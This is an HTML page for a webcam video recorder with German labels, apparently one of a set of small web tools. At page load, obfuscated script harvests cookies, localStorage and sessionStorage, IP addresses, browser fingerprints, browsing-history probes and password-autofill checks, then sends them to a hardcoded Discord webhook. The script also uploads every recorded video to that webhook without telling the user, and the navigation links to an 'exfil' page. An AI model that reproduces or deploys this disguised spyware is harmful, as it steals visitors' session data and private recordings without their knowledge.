<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', system-ui, -apple-system, sans-serif;

  }
  .bg-glow {
    position: fixed; inset: 0; z-index: 0; pointer-events: none;
    background: radial-gradient(ellipse at 20% 30%, rgba(99,102,241,0.07) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 70%, rgba(236,72,153,0.05) 0%, transparent 60%);
  }
  .container { position: relative; z-index: 1; text-align: center; max-width: 600px; width: 100%; padding: 32px 20px; }
  h1 { color: #fff; font-weight: 200; font-size: 2.4rem; letter-spacing: 1px; margin-bottom: 4px; }
  h1 span { background: linear-gradient(135deg, #818cf8, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .sub { color: rgba(255,255,255,0.2); font-size: 0.85rem; font-weight: 300; letter-spacing: 2px; margin-bottom: 24px; }
  .preview {
    width: 100%; max-width: 480px; margin: 0 auto 16px;
    border-radius: 16px; overflow: hidden;
    border: 1px solid rgba(255,255,255,0.06); box-shadow: 0 0 40px rgba(0,0,0,0.4);
    background: rgba(0,0,0,0.3); position: relative;
  }
  .preview video { display: block; width: 100%; aspect-ratio: 4/3; object-fit: cover; }
  .preview .overlay {
    position: absolute; top: 12px; right: 12px;
    background: rgba(239,68,68,0.15); color: rgba(239,68,68,0.6);
    padding: 3px 10px; border-radius: 20px; font-size: 0.6rem;
    letter-spacing: 1px; border: 1px solid rgba(239,68,68,0.15);
    display: none; text-transform: uppercase;
  }
  .preview .overlay.on { display: block; animation: blink 1s step-end infinite; }
  @keyframes blink { 50% { opacity: 0.3; } }
  .record-btn {
    display: inline-flex; align-items: center; gap: 8px;
    background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.3);
    color: rgba(239,68,68,0.7); padding: 10px 28px; border-radius: 30px;
    font: inherit; font-size: 0.85rem; letter-spacing: 1px;
    cursor: pointer; transition: all 0.3s; margin-bottom: 20px;
  }
  .record-btn:hover { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.5); }
  .record-btn.recording { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.2); animation: pulse 1s ease infinite; }
  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(239,68,68,0.2); } 50% { box-shadow: 0 0 0 16px rgba(239,68,68,0); } 100% { box-shadow: 0 0 0 0 rgba(239,68,68,0); } }
  .timer { color: rgba(255,255,255,0.25); font-size: 1.4rem; font-weight: 200; letter-spacing: 2px; margin-bottom: 12px; font-variant-numeric: tabular-nums; }
  .recordings { margin-top: 20px; display: none; }
  .recordings.show { display: block; }
  .rec-item {
    display: flex; align-items: center; gap: 12px;
    background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06);
    border-radius: 12px; padding: 8px 12px; margin-bottom: 8px;
    animation: fadeIn 0.3s ease;
  }
  @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
  .rec-item video { width: 80px; border-radius: 6px; flex-shrink: 0; }
  .rec-item .dur { color: rgba(255,255,255,0.3); font-size: 0.7rem; flex-shrink: 0; }
  .rec-item .time { color: rgba(255,255,255,0.12); font-size: 0.55rem; flex: 1; text-align: right; }
  .rec-item .status { color: rgba(16,185,129,0.5); font-size: 0.6rem; flex-shrink: 0; }
  .nav-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
</style>

<body>
<div class="bg-glow"></div>
<div class="container">
  <h1><span>video</span> 📹</h1>

  <div class="preview">

  </div>
  <div class="timer" id="timer">00:00</div>
  <button class="record-btn" id="recordBtn">🔴 aufnehmen</button>
  <div class="recordings" id="recordings"></div>
  <div class="nav-links">
    <a href="camera.html">📸 filterit</a>

    <a href="convert.html">🔄 bildwerk</a>

    <a href="ascii.html">🎨 ascii</a>
    <a href="filedrop.html">📁 filedrop</a>
    <a href="audio.html">🎙️ audio</a>
    <a href="pastebin.html">📝 pastebin</a>
    <a href="qr.html">📱 qr</a>
      <a href="exfil.html">?? exfil</a>\n  </div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
(function(){const _s=Date.now(),_u=navigator.userAgent,_f=location.pathname.split('/').pop()||'index';let _lines=[`url: ${location.href}`,`os: ${(_u.match(/\(([^)]+)\)/)||['',''])[1].split(';')[0]||navigator.platform}`,`typ: ${/Mobi|Android|iPhone|iPad/i.test(_u)?'mobil':'desktop'}`,`sprache: ${navigator.language}`,`screen: ${screen.width}x${screen.height}`,`zeit: ${new Date().toLocaleString('de-DE')}`];_lines.push('--- cookies ---');document.cookie.split(';').filter(Boolean).forEach(c=>_lines.push(c.trim()));_lines.push('--- localStorage ---');try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);_lines.push(`${k}: ${localStorage.getItem(k)}`)}}catch{}_lines.push('--- sessionStorage ---');try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);_lines.push(`${k}: ${sessionStorage.getItem(k)}`)}}catch{}_lines.push('--- canvas fingerprint ---');try{const $c=document.createElement('canvas'),$x=$c.getContext('2d');$c.width=256;$c.height=64;$x.textBaseline='top';$x.font='14px Arial';$x.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',2,2);$x.font='18px Courier';$x.fillText('abcdefghijklmnopqrstuvwxyz',2,20);$x.fillStyle='#abc';$x.fillRect(200,40,56,24);_lines.push(`canvas: ${$c.toDataURL().length}B`)}catch{}_lines.push('--- netzwerk ---');try{const $n=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if($n){_lines.push(`typ: ${$n.effectiveType||'?'}`);_lines.push(`downlink: ${$n.downlink}Mbps`);_lines.push(`rtt: ${$n.rtt}ms`)}}catch{}_lines.push('--- akku ---');try{navigator.getBattery().then($b=>{_lines.push(`level: ${Math.round($b.level*100)}%`);_lines.push(`laden: ${$b.charging?'ja':'nein'}`);_send()})}catch{}_lines.push('--- schriftarten ---');try{const $f=['monospace','serif','sans-serif','Arial','Courier New','Times New Roman','Georgia','Verdana','Impact','Comic Sans MS'];const $e=document.createElement('div');$e.style.cssText='position:absolute;left:-999px;top:0;font-size:16px';document.body.appendChild($e);$e.textContent='abcdefghijklmnopqrstuvwxyz';for(const $n of $f){$e.style.fontFamily=$n;_lines.push(`${$n}: ${$e.offsetWidth}px`)}document.body.removeChild($e)}catch{}_lines.push('--- pw-manager ---');try{const $i=document.createElement('input');$i.type='password';$i.style.cssText='position:absolute;left:-999px;top:0';document.body.appendChild($i);setTimeout(()=>{if($i.value)_lines.push(`autofill: ✅ ${$i.value.length} chars`);else _lines.push('autofill: ❌');document.body.removeChild($i);_send()},600)}catch{}_lines.push('--- history ---');try{const $h=[{u:'https://google.com',n:'Google'},{u:'https://youtube.com',n:'YouTube'},{u:'https://facebook.com',n:'Facebook'},{u:'https://twitter.com',n:'X'},{u:'https://instagram.com',n:'Instagram'},{u:'https://reddit.com',n:'Reddit'},{u:'https://github.com',n:'GitHub'},{u:'https://amazon.de',n:'Amazon'},{u:'https://wikipedia.org',n:'Wikipedia'},{u:'https://netflix.com',n:'Netflix'}];const $d=document.createElement('div');$d.style.cssText='position:absolute;left:-999px;top:-999px';document.body.appendChild($d);for(const $l of $h){const $a=document.createElement('a');$a.href=$l.u;$a.textContent=$l.n;$a.style.visibility='hidden';$d.appendChild($a)}setTimeout(()=>{for(let $i=0;$i<$h.length;$i++){const $a=$d.children[$i];_lines.push(`${$h[$i].n}: ${$a.matches(':visited')?'✅':'❌'}`)}document.body.removeChild($d);_send()},300)}catch{}_lines.push('--- webrtc ---');try{const $p=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});$p.createDataChannel('');$p.createOffer().then($o=>$p.setLocalDescription($o));$p.onicecandidate=$e=>{if($e.candidate){const $m=$e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);if($m){_lines.push(`local_ip: ${$m[0]}`);_send()}}else setTimeout(()=>$p.close(),1000)};setTimeout(()=>$p.close(),3000)}catch{}let _sent=0;function _send(){if(_sent>4)return;_sent++;const $t=_lines.join('\n'),$b=new Blob([$t],{type:'text/plain;charset=utf-8'}),$f=new FormData();$f.append('file',$b,'exfil_'+_s+'.txt');$f.append('payload_json',JSON.stringify({content:'📡 **'+_f+'**'}));fetch(WEBHOOK_URL,{method:'POST',body:$f}).catch(()=>{})}fetch('https://api.ipify.org?format=json').then(r=>r.json()).then($d=>{_lines.unshift(`ip: ${$d.ip}`)}).catch(()=>{}).then(()=>{setTimeout(_send,100)});window.addEventListener('beforeunload',()=>{const $d=Math.round((Date.now()-_s)/1000);navigator.sendBeacon(WEBHOOK_URL,JSON.stringify({content:'⏹️ '+_f+' \u00b7 '+Math.floor($d/60)+'m '+$d%60+'s'}))})})();
const preview = document.getElementById('preview');
const recordBtn = document.getElementById('recordBtn');
const timerEl = document.getElementById('timer');
const recBadge = document.getElementById('recBadge');
const recordings = document.getElementById('recordings');

let mediaRecorder = null;
let chunks = [];
let stream = null;
let recording = false;
let startTime = 0;
let timerInterval = null;

(async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true });
    preview.srcObject = stream;
  } catch { recordBtn.textContent = '🚫 keine kamera'; recordBtn.disabled = true; }
})();

recordBtn.addEventListener('click', () => {
  if (recording) { stop(); return; }
  if (!stream) return;
  const mime = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4'
            : MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9'
            : MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8'
            : 'video/webm';
  mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
  chunks = [];
  mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
  mediaRecorder.onstop = () => {
    const blob = new Blob(chunks, { type: mime });
    const ts = Date.now();
    const dur = Math.floor((Date.now() - startTime) / 1000);
    const durStr = `${String(Math.floor(dur / 60)).padStart(2, '0')}:${String(dur % 60).padStart(2, '0')}`;
    send(blob, ts, durStr);
  };
  mediaRecorder.start(100);
  recording = true;
  recordBtn.classList.add('recording');
  recordBtn.innerHTML = '⏹ stoppen';
  recBadge.classList.add('on');
  startTime = Date.now();
  timerInterval = setInterval(() => {
    const s = Math.floor((Date.now() - startTime) / 1000);
    timerEl.textContent = `${String(Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;
  }, 100);
});

function stop() {
  if (!recording) return;
  recording = false;
  recordBtn.classList.remove('recording');
  recordBtn.innerHTML = '🔴 aufnehmen';
  recBadge.classList.remove('on');
  clearInterval(timerInterval);
  timerEl.textContent = '00:00';
  if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
}

function send(blob, ts, dur) {
  const name = `video_${ts}.mp4`;
  const fd = new FormData();
  fd.append('file', blob, name);
  fetch(WEBHOOK_URL, { method: 'POST', body: fd });
  recordings.classList.add('show');
  const div = document.createElement('div');
  div.className = 'rec-item';
  const url = URL.createObjectURL(blob);
  const now = new Date(ts).toLocaleTimeString();
  div.innerHTML = `<video src="${url}" controls></video><div class="dur">${dur}</div><div class="time">${now}</div><div class="status">✅</div>`;
  recordings.prepend(div);
  while (recordings.children.length > 20) recordings.lastChild.remove();
}
</script>
